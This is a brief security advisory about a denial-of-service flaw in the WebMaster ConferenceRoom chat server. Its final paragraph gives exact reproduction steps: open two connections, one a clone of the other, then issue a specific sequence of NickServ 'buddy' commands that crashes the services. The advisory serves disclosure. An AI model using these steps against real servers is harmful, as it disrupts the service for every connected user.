WebMaster ConferenceRoom Developer Edition is a chat package which enables a large community of users to chat together. ConferenceRoom has a wide range of capabilities and a user friendly channel moderation feature.

It is possible to cause a denial of service in ConferenceRoom. By making duplicate connections and executing special server commands in both sessions, ConferenceRoom will crash and refuse any new connections. A restart of the service is required in order to gain normal functionality.

Make to connections to the irc server second being the clone of other. On second connection (clone) type "/ns buddy on". on first connection type "/ns buddy add <clone client nickname>". on clone type "/ns auth accept 1" and the services crashes.
